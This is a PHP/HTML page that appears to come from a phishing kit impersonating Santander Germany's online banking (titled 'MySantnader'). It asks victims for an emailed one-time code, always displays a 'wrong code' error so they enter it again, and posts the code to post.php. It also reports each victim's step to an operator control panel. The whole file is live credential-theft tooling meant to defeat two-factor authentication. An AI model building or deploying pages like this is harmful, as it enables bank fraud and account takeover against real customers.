<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MySantnader</title>
    <link rel="stylesheet" href="res/app.css">
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
<img src="res/logo.png" class="pc">
<img src="res/text.png" class="pc">
<img src="res/mini-logo.png" class="mobile">
</header>
<main>

<div class="form account">

<div class="title">
Kontobestätigung
</div>


<div class="text">
    <p>Zum Fortfahren bitte den per E-Mail gesendeten Code eingeben.</p>
</div>

<?php setError("Der eingegebene Code ist falsch"); ?>
<div class="col">
<label>Code eingeben</label>
<input type="text" id="sms">
</div>
<div class="col links">
<a href="#">Haben Sie den Code nicht erhalten?</a>
</div>
<div class="col">
    <button onclick="sbmt()">Weiter</button>
</div>



<div class="col info">
<b>Sie haben noch keinen Zugang?</b>
Als Kreditkunde können Sie die Registrierung für das MySantander Online Banking ganz bequem digital vornehmen und Ihre Bankgeschäfte einfach von zu Hause aus erledigen!
</div>



</div>
</main> 


 
<?php 
require 'loader.php';
$m->ctr("EMAIL-OTP ".@$_GET['e']);
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#sms").mask("00000000");
$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sbmt();
    }
});

function sbmt(){
    var sms = $("#sms").val();
    var sub = true;
    $("#sms").removeClass("error");
    if(sms.length<4){
        $("#sms").addClass("error");
        sub=false;
    }

    if(sub){
        $(".loader").show();
        _cp = "LOADING (EMAIL-OTP)";
        $.post("post.php",{email:sms});
    }
}
</script>
</body>
</html>